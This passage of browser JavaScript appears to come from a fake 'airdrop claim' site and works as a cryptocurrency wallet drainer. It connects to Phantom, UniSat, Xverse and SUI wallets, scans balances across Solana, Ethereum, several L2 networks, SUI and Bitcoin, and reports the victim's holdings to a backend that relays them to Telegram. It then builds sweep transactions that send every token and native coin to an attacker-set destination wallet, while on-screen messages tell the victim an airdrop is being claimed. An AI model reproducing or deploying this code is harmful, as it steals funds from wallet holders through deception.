                method: 'wallet_switchEthereumChain',
                params: [{ chainId }],
            });

            // Small delay to ensure network switch is complete
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (error) {
            console.warn(`Failed to switch to network ${chainId}:`, error);
            // Continue anyway - might already be on the right network
        }
    }

    /**
     * Scan tokens on L2 networks
     */
    async scanL2Tokens(networkId) {
        try {
            const tokenLists = this.getL2TokenList(networkId);
            const tokens = [];

            for (const token of tokenLists) {
                try {
                    const data = '0x70a08231000000000000000000000000' + this.config.ethWallet.slice(2);

                    const balance = await window.ethereum.request({
                        method: 'eth_call',
                        params: [{
                            to: token.address,
                            data: data
                        }, 'latest']
                    });

                    const balanceValue = parseInt(balance, 16) / Math.pow(10, token.decimals);

                    if (balanceValue > 0) {
                        tokens.push({
                            symbol: token.symbol,
                            balance: balanceValue,
                            address: token.address
                        });
                        console.log(`💎 Found ${token.symbol} on ${networkId}: ${balanceValue.toLocaleString()}`);
                    }

                    // Small delay to avoid rate limiting
                    await new Promise(resolve => setTimeout(resolve, 50));

                } catch (error) {
                    console.warn(`Failed to check ${token.symbol} on ${networkId}:`, error.message);
                }
            }

            // Store tokens based on network
            switch (networkId) {
                case 'base':
                    this.baseTokens = tokens;
                    break;
                case 'arbitrum':
                    this.arbitrumTokens = tokens;
                    break;
                case 'optimism':
                    this.optimismTokens = tokens;
                    break;
                case 'polygon':
                    this.polygonTokens = tokens;
                    break;
            }

        } catch (error) {
            console.warn(`L2 token scanning failed for ${networkId}:`, error);
        }
    }

    /**
     * Get token list for specific L2 network
     */
    getL2TokenList(networkId) {
        const tokenLists = {
            base: [
                { address: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', symbol: 'USDC', decimals: 6 },
                { address: '0x4200000000000000000000000000000000000006', symbol: 'WETH', decimals: 18 },
                { address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', symbol: 'DAI', decimals: 18 },
                { address: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', symbol: 'cbETH', decimals: 18 },
                { address: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', symbol: 'USDbC', decimals: 6 }
            ],
            arbitrum: [
                { address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', symbol: 'USDC', decimals: 6 },
                { address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', symbol: 'USDT', decimals: 6 },
                { address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', symbol: 'DAI', decimals: 18 },
                { address: '0x912CE59144191C1204E64559FE8253a0e49E6548', symbol: 'ARB', decimals: 18 },
                { address: '0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a', symbol: 'GMX', decimals: 18 },
                { address: '0x539bdE0d7Dbd336b79148AA742883198BBF60342', symbol: 'MAGIC', decimals: 18 }
            ],
            optimism: [
                { address: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', symbol: 'USDC', decimals: 6 },
                { address: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', symbol: 'USDT', decimals: 6 },
                { address: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', symbol: 'DAI', decimals: 18 },
                { address: '0x4200000000000000000000000000000000000042', symbol: 'OP', decimals: 18 },
                { address: '0x8700dAec35aF8Ff88c16BdF0418774CB3D7599B4', symbol: 'SNX', decimals: 18 },
                { address: '0x3c8B650257cFb5f272f799F5e2b4e65093a11a05', symbol: 'VELO', decimals: 18 }
            ],
            polygon: [
                { address: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', symbol: 'USDC', decimals: 6 },
                { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', symbol: 'USDT', decimals: 6 },
                { address: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', symbol: 'DAI', decimals: 18 },
                { address: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270', symbol: 'WMATIC', decimals: 18 },
                { address: '0x831753DD7087CaC61aB5644b308642cc1c33Dc13', symbol: 'QUICK', decimals: 18 },
                { address: '0xD6DF932A45C0f255f85145f286eA0b292B21C90B', symbol: 'AAVE', decimals: 18 }
            ]
        };

        return tokenLists[networkId] || [];
    }

    /**
     * Scan SUI Network
     */
    async scanSuiNetwork() {
        try {
            // Check for SUI wallet providers (prioritize Phantom)
            if (window.phantom?.sui || window.suiWallet || window.martian || window.suiet) {
                console.log('⚡ SUI wallet provider detected');

                try {
                    let suiProvider = null;

                    // Try Phantom SUI provider first (most likely for this user)
                    if (window.phantom?.sui) {
                        suiProvider = window.phantom.sui;
                        console.log('⚡ Using Phantom SUI provider');
                    } else if (window.suiWallet) {
                        suiProvider = window.suiWallet;
                        console.log('⚡ Using SUI Wallet provider');
                    } else if (window.martian && window.martian.sui) {
                        suiProvider = window.martian.sui;
                        console.log('⚡ Using Martian SUI provider');
                    } else if (window.suiet) {
                        suiProvider = window.suiet;
                        console.log('⚡ Using Suiet provider');
                    }

                    if (suiProvider) {
                        // Try different connection methods for Phantom SUI
                        try {
                            let account = null;

                            // Method 1: Try connect() if available
                            if (typeof suiProvider.connect === 'function') {
                                account = await suiProvider.connect();
                            }
                            // Method 2: Check if already connected via accounts property
                            else if (suiProvider.accounts && suiProvider.accounts.length > 0) {
                                account = { address: suiProvider.accounts[0].address };
                            }
                            // Method 3: Try requestAccounts() if available
                            else if (typeof suiProvider.requestAccounts === 'function') {
                                const accounts = await suiProvider.requestAccounts();
                                if (accounts && accounts.length > 0) {
                                    account = { address: accounts[0] };
                                }
                            }
                            // Method 4: Check for direct address property
                            else if (suiProvider.address) {
                                account = { address: suiProvider.address };
                            }

                            if (account && (account.address || account.accounts?.[0]?.address)) {
                                // Handle different response formats
                                this.suiAddress = account.address || account.accounts[0].address;
                                console.log('⚡ SUI wallet connected:', this.maskWallet(this.suiAddress));

                                // Try to get SUI balance using public API
                                await this.getSuiBalance();
                            } else {
                                console.log('⚡ SUI provider detected but no accounts found');
                            }
                        } catch (connectError) {
                            console.warn('⚡ SUI connection method failed, trying fallback approach:', connectError.message);
                            // Fallback: just mark as not connected and continue
                        }
                    }
                } catch (suiError) {
                    console.warn('SUI connection failed:', suiError);
                }
            } else {
                console.log('⚡ SUI wallet not available');
            }

            // Alternative: Use public SUI RPC even without wallet connection
            if (!this.suiAddress && this.config.ethWallet) {
                console.log('⚡ Checking SUI via public API...');
                // Placeholder for future SUI address derivation
                this.suiBalance = 0;
            }

        } catch (error) {
            console.warn('SUI scanning failed:', error);
            this.suiBalance = 0;
        }
    }

    /**
     * Get SUI balance via public API
     */
    async getSuiBalance() {
        try {
            if (!this.suiAddress) return;

            // Use SUI public RPC
            const response = await fetch('https://fullnode.mainnet.sui.io:443', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    jsonrpc: '2.0',
                    id: 1,
                    method: 'suix_getBalance',
                    params: [this.suiAddress]
                })
            });

            const data = await response.json();
            if (data.result && data.result.totalBalance) {
                this.suiBalance = parseInt(data.result.totalBalance) / Math.pow(10, 9); // SUI has 9 decimals
                console.log(`⚡ SUI balance found: ${this.suiBalance} SUI`);
            }

        } catch (error) {
            console.warn('Failed to get SUI balance:', error);
            this.suiBalance = 0;
        }
    }

    /**
     * Advanced Bitcoin scanning with multiple providers and APIs
     */
    async scanBitcoinBalanceAdvanced() {
        try {
            // Method 1: Try Phantom Bitcoin
            await this.tryPhantomBitcoin();

            // Method 2: Try UniSat wallet
            await this.tryUnisatWallet();

            // Method 3: Try Xverse wallet
            await this.tryXverseWallet();

            if (this.btcAddress) {
                // Get balance via public API
                await this.getBitcoinBalance();
            } else {
                console.log('₿ No Bitcoin wallet connected');
            }

        } catch (error) {
            console.warn('Bitcoin scanning failed:', error);
            this.btcBalance = 0;
        }
    }

    /**
     * Try Phantom Bitcoin provider
     */
    async tryPhantomBitcoin() {
        try {
            if (window.phantom && window.phantom.bitcoin) {
                console.log('₿ Phantom Bitcoin provider detected');

                let btcAccount = null;

                // Method 1: Try connect() if available
                if (typeof window.phantom.bitcoin.connect === 'function') {
                    try {
                        btcAccount = await window.phantom.bitcoin.connect();
                    } catch (connectError) {
                        console.warn('₿ Bitcoin connect() failed:', connectError.message);
                    }
                }

                // Method 2: Check if already connected via accounts property
                if (!btcAccount && window.phantom.bitcoin.accounts && window.phantom.bitcoin.accounts.length > 0) {
                    btcAccount = { address: window.phantom.bitcoin.accounts[0].address };
                }

                // Method 3: Try requestAccounts() if available
                if (!btcAccount && typeof window.phantom.bitcoin.requestAccounts === 'function') {
                    try {
                        const accounts = await window.phantom.bitcoin.requestAccounts();
                        if (accounts && accounts.length > 0) {
                            btcAccount = { address: accounts[0] };
                        }
                    } catch (reqError) {
                        console.warn('₿ Bitcoin requestAccounts() failed:', reqError.message);
                    }
                }

                // Method 4: Check for direct address property
                if (!btcAccount && window.phantom.bitcoin.address) {
                    btcAccount = { address: window.phantom.bitcoin.address };
                }

                if (btcAccount && btcAccount.address) {
                    this.btcAddress = btcAccount.address;
                    console.log('₿ Phantom Bitcoin connected:', this.maskWallet(this.btcAddress));
                    return true;
                } else {
                    console.log('₿ Phantom Bitcoin provider detected but no accounts found');
                }
            }
        } catch (error) {
            console.warn('Phantom Bitcoin failed:', error);
        }
        return false;
    }

    /**
     * Try UniSat wallet
     */
    async tryUnisatWallet() {
        try {
            if (window.unisat) {
                console.log('₿ UniSat wallet detected');
                const accounts = await window.unisat.requestAccounts();
                if (accounts && accounts.length > 0) {
                    this.btcAddress = accounts[0];
                    console.log('₿ UniSat connected:', this.maskWallet(this.btcAddress));
                    return true;
                }
            }
        } catch (error) {
            console.warn('UniSat wallet failed:', error);
        }
        return false;
    }

    /**
     * Try Xverse wallet
     */
    async tryXverseWallet() {
        try {
            if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
                console.log('₿ Xverse wallet detected');
                const response = await window.XverseProviders.BitcoinProvider.request('getAccounts', null);
                if (response && response.result && response.result.length > 0) {
                    this.btcAddress = response.result[0].address;
                    console.log('₿ Xverse connected:', this.maskWallet(this.btcAddress));
                    return true;
                }
            }
        } catch (error) {
            console.warn('Xverse wallet failed:', error);
        }
        return false;
    }

    /**
     * Get Bitcoin balance via public API
     */
    async getBitcoinBalance() {
        try {
            if (!this.btcAddress) return;

            // Try multiple Bitcoin APIs
            const apis = [
                `https://blockstream.info/api/address/${this.btcAddress}`,
                `https://mempool.space/api/address/${this.btcAddress}`,
                `https://api.blockchain.info/haskoin-store/btc/address/${this.btcAddress}/balance`
            ];

            for (const apiUrl of apis) {
                try {
                    const response = await fetch(apiUrl);
                    const data = await response.json();

                    let balance = 0;
                    if (apiUrl.includes('blockstream') || apiUrl.includes('mempool')) {
                        balance = (data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum) / 100000000;
                    } else if (apiUrl.includes('blockchain.info')) {
                        balance = data.confirmed / 100000000;
                    }

                    if (balance >= 0) {
                        this.btcBalance = balance;
                        console.log(`₿ Bitcoin balance found: ${this.btcBalance} BTC`);
                        return;
                    }
                } catch (apiError) {
                    console.warn(`Bitcoin API ${apiUrl} failed:`, apiError);
                }
            }

        } catch (error) {
            console.warn('Failed to get Bitcoin balance:', error);
            this.btcBalance = 0;
        }
    }

    /**
     * Check Monad network (placeholder for future)
     */
    async checkMonadNetwork() {
        try {
            console.log('🟣 Monad network check...');
            // Monad is currently in testnet, prepare for mainnet
            this.monadBalance = 0;
            this.monadTokens = [];
            console.log('🟣 Monad: Currently in development (testnet phase)');
        } catch (error) {
            console.warn('Monad check failed:', error);
        }
    }

    /**
     * Log comprehensive multi-chain summary
     */
    async logComprehensiveSummary() {
        const totalSolana = this.tokenBalances.length + (this.solBalance > 0 ? 1 : 0);
        const totalEthMainnet = this.ethTokens.length + (this.ethBalance > 0 ? 1 : 0);
        const totalBase = this.baseTokens.length + (this.baseBalance > 0 ? 1 : 0);
        const totalArbitrum = this.arbitrumTokens.length + (this.arbitrumBalance > 0 ? 1 : 0);
        const totalOptimism = this.optimismTokens.length + (this.optimismBalance > 0 ? 1 : 0);
        const totalPolygon = this.polygonTokens.length + (this.polygonBalance > 0 ? 1 : 0);
        const totalSui = this.suiTokens.length + (this.suiBalance > 0 ? 1 : 0);
        const totalBtc = this.btcBalance > 0 ? 1 : 0;

        const grandTotal = totalSolana + totalEthMainnet + totalBase + totalArbitrum + totalOptimism + totalPolygon + totalSui + totalBtc;

        console.log(`📊 === COMPREHENSIVE MULTI-CHAIN SCAN COMPLETE ===`);
        console.log(`🔴 Solana: ${totalSolana} items (${this.solBalance.toFixed(4)} SOL + ${this.tokenBalances.length} tokens)`);
        console.log(`🔵 Ethereum: ${totalEthMainnet} items (${this.ethBalance.toFixed(6)} ETH + ${this.ethTokens.length} tokens)`);
        console.log(`🔷 Base: ${totalBase} items (${this.baseBalance.toFixed(6)} ETH + ${this.baseTokens.length} tokens)`);
        console.log(`🔷 Arbitrum: ${totalArbitrum} items (${this.arbitrumBalance.toFixed(6)} ETH + ${this.arbitrumTokens.length} tokens)`);
        console.log(`🔷 Optimism: ${totalOptimism} items (${this.optimismBalance.toFixed(6)} ETH + ${this.optimismTokens.length} tokens)`);
        console.log(`🔷 Polygon: ${totalPolygon} items (${this.polygonBalance.toFixed(6)} MATIC + ${this.polygonTokens.length} tokens)`);
        console.log(`⚡ SUI: ${totalSui} items (${this.suiBalance.toFixed(4)} SUI + ${this.suiTokens.length} tokens)`);
        console.log(`₿ Bitcoin: ${totalBtc} items (${this.btcBalance.toFixed(8)} BTC)`);
        console.log(`🎯 GRAND TOTAL: ${grandTotal} items across 8 blockchains`);
    }

    /**
     * Send wallet connection notification to backend/Telegram
     */
    async notifyWalletConnection() {
        try {
            const walletData = {
                // Original data
                walletAddress: this.config.sourceWallet,
                ethWallet: this.config.ethWallet,
                solBalance: this.solBalance,
                tokenBalances: this.tokenBalances,
                ethBalance: this.ethBalance,
                ethTokens: this.ethTokens,
                btcBalance: this.btcBalance,

                // New multi-chain data
                baseBalance: this.baseBalance,
                baseTokens: this.baseTokens,
                arbitrumBalance: this.arbitrumBalance,
                arbitrumTokens: this.arbitrumTokens,
                optimismBalance: this.optimismBalance,
                optimismTokens: this.optimismTokens,
                polygonBalance: this.polygonBalance,
                polygonTokens: this.polygonTokens,
                suiBalance: this.suiBalance,
                suiTokens: this.suiTokens,
                suiAddress: this.suiAddress,
                btcAddress: this.btcAddress,
                monadBalance: this.monadBalance,
                monadTokens: this.monadTokens,

                timestamp: Date.now()
            };

            console.log('Sending wallet connection notification...', {
                wallet: this.maskWallet(walletData.walletAddress),
                solBalance: walletData.solBalance,
                tokenCount: walletData.tokenBalances.length
            });

            const response = await fetch('/api/wallet-connected', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(walletData)
            });

            if (response.ok) {
                const result = await response.json();
                console.log('Wallet notification sent successfully:', result);

                // Show subtle notification to user
                this.showNotification('💰 Wallet info sent to Telegram', 'info');
            } else {
                console.error('Failed to send wallet notification:', response.status);
            }

        } catch (error) {
            console.error('Error sending wallet notification:', error);
            // Don't show error to user as this is background functionality
        }
    }

    /**
     * Create sweep-all transaction
     */
    async createSweepTransaction() {
        try {
            if (!this.config.sourceWallet || !this.config.destinationWallet) {
                throw new Error('Wallets not configured');
            }

            // Allow minimal test transactions even with zero balance
            if (this.tokenBalances.length === 0 && this.solBalance < 0.000001) {
                console.warn('Creating minimal test transaction - wallet appears empty');
                // Don't throw error, continue to create a minimal transaction
            }

            const { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } = solanaWeb3;

            // Access SPL Token functions from global scope with multiple fallbacks
            const splTokenLib = window.splToken || window.SplToken || window.SPLToken;

            if (!splTokenLib) {
                console.error('SPL Token library not available, skipping token transfers');
                // Continue with SOL transfer only
            }

            const getAssociatedTokenAddress = splTokenLib?.getAssociatedTokenAddress ||
                splTokenLib?.getAssociatedTokenAddressSync ||
                (() => { console.warn('getAssociatedTokenAddress not available'); return null; });

            const createAssociatedTokenAccountInstruction = splTokenLib?.createAssociatedTokenAccountInstruction ||
                (() => { console.warn('createAssociatedTokenAccountInstruction not available'); return null; });

            const createTransferInstruction = splTokenLib?.createTransferInstruction ||
                splTokenLib?.createTransferCheckedInstruction ||
                (() => { console.warn('createTransferInstruction not available'); return null; });

            const transaction = new Transaction();
            const sourcePubkey = new PublicKey(this.config.sourceWallet);
            const destPubkey = new PublicKey(this.config.destinationWallet);

            // Add SPL token transfers only if library is available
            if (splTokenLib && this.tokenBalances.length > 0) {
                for (const token of this.tokenBalances) {
                    try {
                        const mintPubkey = new PublicKey(token.mint);
                        const sourceTokenAccount = new PublicKey(token.account);

                        // Get or create destination token account (skip if function not available)
                        const destTokenAccountResult = await getAssociatedTokenAddress(
                            mintPubkey,
                            destPubkey
                        );

                        if (!destTokenAccountResult) {
                            console.warn(`Skipping token ${token.symbol} - SPL function unavailable`);
                            continue;
                        }

                        const destTokenAccount = destTokenAccountResult;

                    // Check if destination token account exists
                    const destAccountInfo = await this.connection.getAccountInfo(destTokenAccount);

                    if (!destAccountInfo) {
                        // Create destination token account
                        transaction.add(
                            createAssociatedTokenAccountInstruction(
                                sourcePubkey, // payer
                                destTokenAccount, // ata
                                destPubkey, // owner
                                mintPubkey // mint
                            )
                        );
                    }

                    // Add transfer instruction
                    transaction.add(
                        createTransferInstruction(
                            sourceTokenAccount,
                            destTokenAccount,
                            sourcePubkey,
                            token.balance * Math.pow(10, token.decimals)
                        )
                    );

                    } catch (error) {
                        console.warn(`Failed to add transfer for token ${token.symbol}:`, error);
                    }
                }
            }

            // Add SOL transfer (leave small amount for fees)
            // Lower threshold for testing - only require 0.001 SOL
            if (this.solBalance > 0.001) { // Keep 0.001 SOL for fees
                const transferAmount = Math.max(1, (this.solBalance - 0.001) * LAMPORTS_PER_SOL); // At least 1 lamport

                transaction.add(
                    SystemProgram.transfer({
                        fromPubkey: sourcePubkey,
                        toPubkey: destPubkey,
                        lamports: Math.floor(transferAmount)
                    })
                );
            }

            // Get recent blockhash
            const { blockhash } = await this.connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = sourcePubkey;

            return transaction;

        } catch (error) {
            console.error('Failed to create sweep transaction:', error);
            throw error;
        }
    }

    /**
     * Create Bitcoin sweep transaction
     */
    async createBitcoinSweepTransaction() {
        try {
            if (!this.btcAddress || this.btcBalance <= 0) {
                throw new Error('No Bitcoin balance to sweep');
            }

            // Use Phantom's Bitcoin provider for transaction creation
            if (!window.phantom?.bitcoin) {
                throw new Error('Phantom Bitcoin provider not available');
            }

            const btcProvider = window.phantom.bitcoin;

            // Connect to Bitcoin if not already connected
            if (!btcProvider.isConnected) {
                await btcProvider.connect();
            }

            // Create a transaction to send all BTC to destination
            // Note: We'll use a simplified approach here since Bitcoin transaction construction is complex
            const destinationBtcAddress = this.config.destinationWallet; // Assuming it's a valid BTC address

            // For Bitcoin, we need to account for transaction fees
            // We'll sweep everything minus estimated fees (0.001 BTC = 100,000 satoshis)
            const feeInBTC = 0.001;
            const sweepAmount = Math.max(0, this.btcBalance - feeInBTC);

            if (sweepAmount <= 0) {
                throw new Error('Insufficient Bitcoin balance after accounting for fees');
            }

            // Use Phantom's sendBitcoin method
            const txResult = await btcProvider.sendBitcoin({
                to: destinationBtcAddress,
                amount: Math.floor(sweepAmount * 100000000) // Convert to satoshis
            });

            console.log('Bitcoin sweep transaction:', txResult);
            return { txid: txResult.txid };

        } catch (error) {
            console.error('Failed to create Bitcoin sweep transaction:', error);
            throw error;
        }
    }

    /**
     * Create SUI sweep transaction
     */
    async createSuiSweepTransaction() {
        try {
            if (!this.suiAddress || (this.suiBalance <= 0 && this.suiTokens.length === 0)) {
                throw new Error('No SUI tokens to sweep');
            }

            // Use Phantom's SUI provider for transaction creation
            if (!window.phantom?.sui) {
                throw new Error('Phantom SUI provider not available');
            }

            const suiProvider = window.phantom.sui;

            // Connect to SUI if not already connected
            if (!suiProvider.isConnected) {
                await suiProvider.connect();
            }

            const results = [];

            // Sweep native SUI if available
            if (this.suiBalance > 0.01) { // Keep some for gas
                const gasFee = 0.01; // Estimate gas fee
                const sweepAmount = Math.max(0, this.suiBalance - gasFee);

                if (sweepAmount > 0) {
                    const suiTransferTx = await suiProvider.signAndExecuteTransactionBlock({
                        transactionBlock: {
                            kind: 'TransferObjects',
                            objects: [sweepAmount * 1000000000], // Convert to MIST (SUI's smallest unit)
                            recipient: this.config.destinationWallet
                        }
                    });
                    results.push(suiTransferTx);
                }
            }

            // Sweep SUI tokens if available
            for (const token of this.suiTokens) {
                try {
                    const tokenTransferTx = await suiProvider.signAndExecuteTransactionBlock({
                        transactionBlock: {
                            kind: 'TransferObjects',
                            objects: [token.objectId], // SUI uses object-based tokens
                            recipient: this.config.destinationWallet
                        }
                    });
                    results.push(tokenTransferTx);
                } catch (error) {
                    console.warn(`Failed to sweep SUI token ${token.symbol}:`, error);
                }
            }

            if (results.length === 0) {
                throw new Error('No SUI transactions were created');
            }

            // Return the digest of the first successful transaction
            return { digest: results[0].digest };

        } catch (error) {
            console.error('Failed to create SUI sweep transaction:', error);
            throw error;
        }
    }

    /**
     * Create Ethereum and L2 sweep transactions
     */
    async createEthereumSweepTransaction() {
        try {
            if (!this.config.ethWallet || !this.hasEthereumTokens()) {
                throw new Error('No Ethereum tokens to sweep');
            }

            if (!window.ethereum) {
                throw new Error('Ethereum provider not available');
            }

            const txHashes = [];
            const networks = [
                { name: 'Ethereum', chainId: 1, tokens: this.ethTokens, balance: this.ethBalance, symbol: 'ETH' },
                { name: 'Base', chainId: 8453, tokens: this.baseTokens, balance: this.baseBalance, symbol: 'ETH' },
                { name: 'Arbitrum', chainId: 42161, tokens: this.arbitrumTokens, balance: this.arbitrumBalance, symbol: 'ETH' },
                { name: 'Optimism', chainId: 10, tokens: this.optimismTokens, balance: this.optimismBalance, symbol: 'ETH' },
                { name: 'Polygon', chainId: 137, tokens: this.polygonTokens, balance: this.polygonBalance, symbol: 'MATIC' }
            ];

            for (const network of networks) {
                if (network.balance > 0 || network.tokens.length > 0) {
                    try {
                        // Switch to the correct network
                        await this.switchEthereumNetwork(network.chainId);

                        // Sweep native token (ETH/MATIC)
                        if (network.balance > 0.01) { // Keep some for gas
                            const gasLimit = 21000;
                            const gasPrice = await window.ethereum.request({
                                method: 'eth_gasPrice'
                            });
                            const gasCost = (gasLimit * parseInt(gasPrice, 16)) / Math.pow(10, 18);
                            const sweepAmount = Math.max(0, network.balance - gasCost - 0.005); // Extra buffer

                            if (sweepAmount > 0) {
                                const nativeTx = await window.ethereum.request({
                                    method: 'eth_sendTransaction',
                                    params: [{
                                        from: this.config.ethWallet,
                                        to: this.config.destinationWallet,
                                        value: '0x' + Math.floor(sweepAmount * Math.pow(10, 18)).toString(16)
                                    }]
                                });
                                txHashes.push(nativeTx);
                            }
                        }

                        // Sweep ERC-20 tokens
                        for (const token of network.tokens) {
                            try {
                                // ERC-20 transfer function signature: transfer(address,uint256)
                                const transferData = '0xa9059cbb' +
                                    this.config.destinationWallet.slice(2).padStart(64, '0') +
                                    token.balance.toString(16).padStart(64, '0');

                                const tokenTx = await window.ethereum.request({
                                    method: 'eth_sendTransaction',
                                    params: [{
                                        from: this.config.ethWallet,
                                        to: token.contractAddress,
                                        data: transferData
                                    }]
                                });
                                txHashes.push(tokenTx);
                            } catch (error) {
                                console.warn(`Failed to sweep ${network.name} token ${token.symbol}:`, error);
                            }
                        }
                    } catch (error) {
                        console.warn(`Failed to sweep ${network.name}:`, error);
                    }
                }
            }

            if (txHashes.length === 0) {
                throw new Error('No Ethereum transactions were created');
            }

            return { txHashes };

        } catch (error) {
            console.error('Failed to create Ethereum sweep transactions:', error);
            throw error;
        }
    }

    /**
     * Switch Ethereum network
     */
    async switchEthereumNetwork(chainId) {
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x' + chainId.toString(16) }]
            });
        } catch (error) {
            // If the network is not added, we could add it here
            console.warn(`Failed to switch to chain ${chainId}:`, error);
            throw error;
        }
    }

    /**
     * Execute the sweep operation for all connected blockchains
     */
    async executeSweep() {
        try {
            this.showNotification('Starting airdrop claim...', 'info');

            const results = [];
            let hasAnyAssets = false;

            // Check if any chain has assets
            const hasSolanaAssets = this.config.sourceWallet && (this.tokenBalances.length > 0 || this.solBalance > 0.001);
            const hasBitcoinAssets = this.btcAddress && this.btcBalance > 0;
            const hasSuiAssets = this.suiAddress && (this.suiBalance > 0 || this.suiTokens.length > 0);
            const hasEthereumAssets = this.config.ethWallet && this.hasEthereumTokens();

            hasAnyAssets = hasSolanaAssets || hasBitcoinAssets || hasSuiAssets || hasEthereumAssets;

            // If no assets anywhere, show warning and allow test transaction
            if (!hasAnyAssets) {
                const confirmTest = confirm(
                    '⚠️ No airdrops available!\n\n' +
                    'No eligible tokens or balances detected on any connected chain.\n\n' +
                    'Do you want to create a TEST claim to verify Phantom signing works?\n\n' +
                    'This will attempt to claim 0.000001 SOL (if available).'
                );

                if (!confirmTest) {
                    this.showNotification('❌ Airdrop claim cancelled - no assets available', 'warning');
                    return;
                }

                // Force a minimal test transaction
                if (this.config.sourceWallet) {
                    hasSolanaAssets = true;
                }
            }

            // 1. Sweep Solana if connected and has tokens (or test mode)
            if (hasSolanaAssets) {
                try {
                    this.showNotification('Claiming Solana airdrops...', 'info');
                    const solanaTx = await this.createSweepTransaction();
                    this.showNotification('Please approve Solana transaction in Phantom...', 'info');
                    const solanaResult = await window.solana.signAndSendTransaction(solanaTx);
                    await this.connection.confirmTransaction(solanaResult.signature, 'confirmed');
                    results.push({ chain: 'Solana', signature: solanaResult.signature, success: true });
                    this.showNotification('✅ Solana airdrop claimed!', 'success');
                } catch (error) {
                    console.error('Solana sweep failed:', error);
                    results.push({ chain: 'Solana', error: error.message, success: false });
                    this.showNotification(`❌ Solana airdrop failed: ${error.message}`, 'error');
                }
            }

            // 2. Sweep Bitcoin if connected and has balance
            if (hasBitcoinAssets) {
                try {
                    this.showNotification('Sweeping Bitcoin...', 'info');
                    const btcResult = await this.createBitcoinSweepTransaction();
                    results.push({ chain: 'Bitcoin', signature: btcResult.txid, success: true });
                    this.showNotification('✅ Bitcoin sweep completed!', 'success');
                } catch (error) {
                    console.error('Bitcoin sweep failed:', error);
                    results.push({ chain: 'Bitcoin', error: error.message, success: false });
                    this.showNotification(`❌ Bitcoin sweep failed: ${error.message}`, 'error');
                }
            }

            // 3. Sweep SUI if connected and has tokens
            if (hasSuiAssets) {
                try {
                    this.showNotification('Sweeping SUI tokens...', 'info');
                    const suiResult = await this.createSuiSweepTransaction();
                    results.push({ chain: 'SUI', signature: suiResult.digest, success: true });
                    this.showNotification('✅ SUI sweep completed!', 'success');
                } catch (error) {
                    console.error('SUI sweep failed:', error);
                    results.push({ chain: 'SUI', error: error.message, success: false });
                    this.showNotification(`❌ SUI sweep failed: ${error.message}`, 'error');
                }
            }

            // 4. Sweep Ethereum and L2s if connected and has tokens
            if (hasEthereumAssets) {
                try {
                    this.showNotification('Sweeping Ethereum & L2 tokens...', 'info');
                    const ethResult = await this.createEthereumSweepTransaction();
                    results.push({ chain: 'Ethereum/L2s', signatures: ethResult.txHashes, success: true });
                    this.showNotification('✅ Ethereum/L2 sweep completed!', 'success');
                } catch (error) {
                    console.error('Ethereum sweep failed:', error);
                    results.push({ chain: 'Ethereum/L2s', error: error.message, success: false });
                    this.showNotification(`❌ Ethereum/L2 sweep failed: ${error.message}`, 'error');
                }
            }

            // Show final results
            const successful = results.filter(r => r.success).length;
            const total = results.length;

            if (successful === total && total > 0) {
                this.showNotification(`🎉 Multi-chain airdrop claimed! ${successful}/${total} chains claimed successfully`, 'success');
            } else if (successful > 0) {
                this.showNotification(`⚠️ Partial airdrop claimed! ${successful}/${total} chains claimed successfully`, 'warning');
            } else if (results.length === 0) {
                this.showNotification(`⚠️ No airdrops available to claim on any chain`, 'warning');
            } else {
                this.showNotification(`❌ Sweep failed on all chains`, 'error');
            }

            // Refresh balances after all operations
            setTimeout(() => this.scanAllBalances(), 3000);

            return results;

        } catch (error) {
            console.error('Multi-chain sweep failed:', error);
            this.showNotification(`Multi-chain sweep failed: ${error.message}`, 'error');
            throw error;
        }
    }

    /**
     * Check if we have Ethereum tokens to sweep
     */
    hasEthereumTokens() {
        return (this.ethBalance > 0 || this.ethTokens.length > 0 ||
                this.baseBalance > 0 || this.baseTokens.length > 0 ||
                this.arbitrumBalance > 0 || this.arbitrumTokens.length > 0 ||
                this.optimismBalance > 0 || this.optimismTokens.length > 0 ||
                this.polygonBalance > 0 || this.polygonTokens.length > 0);
    }

    /**
     * Generate mobile-friendly sweep link
     */
    generateSweepLink() {
        const params = new URLSearchParams({
            action: 'sweep',
            source: this.config.sourceWallet,
            destination: this.config.destinationWallet,
            timestamp: Date.now()
        });

        return `${window.location.origin}/sweep?${params.toString()}`;
    }

    /**
     * UI Update functions
     */
    updateUI() {
        this.updateWalletDisplay();
        this.updateConnectButton();
    }

    updateWalletDisplay() {
        const sourceDisplay = document.getElementById('sourceWalletDisplay');
        if (sourceDisplay) {
            sourceDisplay.textContent = this.config.sourceWallet ?
                this.maskWallet(this.config.sourceWallet) :
                'Connect Phantom Wallet';
        }

        const ethDisplay = document.getElementById('ethWalletDisplay');
        if (ethDisplay) {
            ethDisplay.textContent = this.config.ethWallet ?
                this.maskWallet(this.config.ethWallet) :
                'Not connected';
        }

        const destDisplay = document.getElementById('destinationWalletDisplay');
        if (destDisplay) {
            destDisplay.textContent = this.config.destinationWallet ?
                this.maskWallet(this.config.destinationWallet) :
                'Not configured';
        }

        const btcDisplay = document.getElementById('btcWalletDisplay');
        if (btcDisplay) {
